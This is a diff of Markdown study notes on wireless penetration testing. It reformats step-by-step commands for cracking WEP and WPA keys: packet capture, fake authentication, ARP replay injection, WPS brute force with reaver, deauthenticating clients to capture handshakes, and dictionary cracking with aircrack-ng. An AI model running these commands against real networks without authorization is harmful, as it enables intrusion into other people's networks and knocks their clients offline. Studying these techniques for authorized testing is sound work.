@@ -21,7 +21,7 @@ Monitordevice has the same name than interface
 > ifconfig [interface] up
 ```
 
-# Network Penetration Testing - Pre Connection Attacks
+# Pre Connection Attacks
 ### Start general packet sniffing
 
 ```
@@ -64,7 +64,7 @@ Example:
 
 ```
 
-# Gaining access to encrypted networks 
+# Gaining Access To Encrypted Networks 
 
 ## WEP Cracking 
 
@@ -74,23 +74,34 @@ in a busy network we can collect more than two packets with the same IV.
 ### CASE 1: BASE CASE
 
 Log the traffic from the target network
+```
+> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
 
-`> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]`
-Ex: `> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0`
+Example: 
+
+> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
+```
 
 try to crack the key using the capturefile
+```
+> aircrack-ng [file-name]
 
-`> aircrack-ng [file-name]`
-Ex: `> aircrack-ng out.cap`
+Example: 
 
+> aircrack-ng out.cap
+```
 
 ### CASE 2: AP is idle or no clients associated with AP (packet injection)
 
 we have to authenticate our wifi card with the AP, because AP's ignore 
 any requests that come from devices that are not associated with the AP
+```
+> aireplay-ng --fakeauth 0 -a [targe MAC] -h [your MAC] [interface]`
 
-`> aireplay-ng --fakeauth 0 -a [targe MAC] -h [your MAC] [interface]`
-ex: `> aireplay-ng --fakeauth 0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0`
+Example: 
+
+> aireplay-ng --fakeauth 0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
+```
 
 	If this fake authentication was successful the value under the
 	“AUTH” column in airodump-ng will change to “OPN”
@@ -100,9 +111,13 @@ inject it into the traffic , this will force the AP to generate a new
 ARP packet with a new IV , we capture this new packet and inject into 
 the traffic again , this process is repeated until the number of IV's 
 captured is sufficient enough to crack the key.
+```
+> aireplay-ng --arpreplay -b [targe MAC] -h [your MAC] [interface]
 
-`> aireplay-ng --arpreplay -b [targe MAC] -h [your MAC] [interface]`
-ex: `> aireplay-ng --arpreplay -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0`
+Example: 
+
+> aireplay-ng --arpreplay -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
+```
 
 Then we try to crack the key
 
@@ -112,43 +127,69 @@ Then we try to crack the key
 
 ### CASE 1: BASE CASE WITH WPS ENABLED 
 
-encrypted with a unique temporary key, number of data collected is irrelevant.
+Encrypted with a unique temporary key, number of data collected is irrelevant.
 
 Scan for AP's where WPS is enabled (vulnerable)
-`> wash -i [interface]`
-Ex: `> wash -i mon0`
+```
+> wash -i [interface]
 
-brute force the WPS ping and calculate the WPA key
-`> reaver -i [interface] -b [TARGET AP MAC] -c [TARGET CHANNEL] -vv`
-ex: `> reaver -b E0:69:95:8E:18:22 -c 11 -i mon0`
+Example:
+
+> wash -i mon0
+```
+
+Brute force the WPS ping and calculate the WPA key
+```
+> reaver -i [interface] -b [TARGET AP MAC] -c [TARGET CHANNEL] -vv
+
+Example: 
+
+> reaver -b E0:69:95:8E:18:22 -c 11 -i mon0
+```
 
 
 ### CASE 2: WPS DISABLED, CAPTURING HANDSHAKE
 
 Handshake packets are sent every time a client associates with the target AP.
 Start airodump to see if there are clients connected to the AP
+```
+> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
 
-`> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]`
-Ex: `> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0`
+Example: 
 
+> airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0
+```
 Wait for a client to connect to the AP, or deauthenticate a connected
 client (if any) for a very short period of time so that their system will
 connect back automatically.
+```
+> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]
 
-`> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]`
-Ex: `> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0`
+Example: 
+
+> aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0
+```
 (Notice top right corner of airodump-ng will say “WPA handshake”.)
 
 ## Creating a wordlist
 we need a list of all the possible passwords, you can create them yourself
+```
+> crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file
 
-`> crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file`
-ex: `> crunch 6 8 123456!"£$% -o wordlist -t a@@@@b`
+Example: 
+
+> crunch 6 8 123456!"£$% -o wordlist -t a@@@@b
+```
 
 Use aircrack to crack the key
 
-`> aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]`
-ex: `> aircrack-ng is-01.cap -w list mon0`
+```
+> aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]
+
+Example:
+
+> aircrack-ng is-01.cap -w list mon0
+```
 
 # POST CONNECTION ATTACKS (TOT HIER OPMAAK)
 
